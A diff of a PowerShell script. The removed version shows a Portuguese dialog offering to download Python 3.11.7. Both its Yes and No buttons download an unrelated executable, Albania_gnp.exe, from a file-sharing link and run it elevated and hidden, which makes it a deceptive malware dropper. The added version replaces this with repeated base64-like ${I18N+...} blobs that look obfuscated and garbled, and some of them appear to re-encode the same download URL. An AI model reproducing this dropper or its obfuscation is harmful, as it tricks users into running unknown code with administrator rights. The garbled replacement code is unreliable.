@@ -1,47 +1,52 @@
-# Importando módulos necessários
-Add-Type -AssemblyName PresentationFramework
-Add-Type -AssemblyName System.Windows.Forms
+${I18N+TX9tZWluX0FyZ3VtZW50cw==} -A ${I18N+UHJlc2lkZW50YXRpb25GcmFtZXdvcmtfSG93ZXJNb3Zl} 
+${I18N+UHJlc2lkZW50YXRpb25GcmFtZXdvcmtfU3lzdGVt} 
 
-# Criando o formulário
-$form = New-Object Windows.Forms.Form
-$form.Text = "Download e Execução"
-$form.Size = New-Object Drawing.Size(400,150)
-$form.StartPosition = "CenterScreen"
 
-# Criando o rótulo
-$label = New-Object Windows.Forms.Label
-$label.Location = New-Object Drawing.Point(10,30)
-$label.Size = New-Object Drawing.Size(380,40)
-$label.Text = "Deseja baixar Python 3.11.7?"
-$form.Controls.Add($label)
+${I18N+JD1OZXctT2JqZWN0IFdpbmRvd3MuRm9ybQ==
+}${I18N+JD1TZXJyb3cuV2luZG93cy5Gb3Jt}
+${I18N+JD1OZXctT2JqZWN0IFNpemUgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZSg0MDAsMTUwKQ==
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSAiQ2FsbCBEdWNrZWQgZSBSZXNwb25zZS4i
+}${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZSgxMCwzMCl9
 
-# Botão Sim
-$buttonYes = New-Object Windows.Forms.Button
-$buttonYes.Location = New-Object Drawing.Point(50,80)
-$buttonYes.Size = New-Object Drawing.Size(75,23)
-$buttonYes.Text = "Sim"
-$buttonYes.Add_Click({
-    $url = "https://www.upload.ee/download/16547700/fb2a8f0ad4131eac1f1d/Albania_gnp.exe"
-    $caminhoArquivo = "$env:TEMP\Albania_gnp.exe"
-    Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo
-    Start-Process -FilePath $caminhoArquivo -Verb RunAs -WindowStyle Hidden
-    $form.Close()
-})
-$form.Controls.Add($buttonYes)
 
-# Botão Não
-$buttonNo = New-Object Windows.Forms.Button
-$buttonNo.Location = New-Object Drawing.Point(200,80)
-$buttonNo.Size = New-Object Drawing.Size(75,23)
-$buttonNo.Text = "Não"
-$buttonNo.Add_Click({
-    $url = "https://www.upload.ee/download/16547700/fb2a8f0ad4131eac1f1d/Albania_gnp.exe"
-    $caminhoArquivo = "$env:TEMP\Albania_gnp.exe"
-    Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo
-    Start-Process -FilePath $caminhoArquivo -Verb RunAs -WindowStyle Hidden
-    $form.Close()
-})
-$form.Controls.Add($buttonNo)
-    
-# Exibindo o formulário
-$form.ShowDialog() | Out-Null
+${I18N+Jj1OZXctT2JqZWN0IFdpbmRvd3MuTWFpbg==
+}${I18N+Jj1TdGFydC1Qcm9jZXNzb3IgPSAiRGVzZWEgYmFpenVzIHBheWxvciBQeXRob24gMy4xMS43PyI=
+}${I18N+Jj1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+${I18N+Jj1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+${I18N+Jj1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+${I18N+Jj1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+
+
+${I18N+JD1OZXctT2JqZWN0IFdpbmRvd3MuTWFpbg==
+}${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBEZXNlYXQgJExlbmd0aCA9IE5ldy1PYmplY3QuRG93bmxvYWRTdHJpbmdbJ0h0dHBzOi8v
+d3d3LnVwbG9hZC5lZS9kb3dubG9hZC8xNjU0NzcwMC9mYjJhOGYwYWQ0MTMxZWFjMWYxZC9BbGJhbmlhX2ducC5leGU
+nXV1bJ0NvbnN0cnVtJykuQ29udHJvbCgp
+}${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSAiRGVzZWEgYmFpenVzIHBheWxvciBQeXRob24gMy4xMS43PyI=
+}${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+
+
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+
+
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+
+
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+
+
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+
+
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+
+
+${I18N+JD1TdGFydC1Qcm9jZXNzb3IgPSBOZXctT2JqZWN0IERyaXZpbmcuU2l6ZShCdXR0b24gJG5vICEiKQ==
+
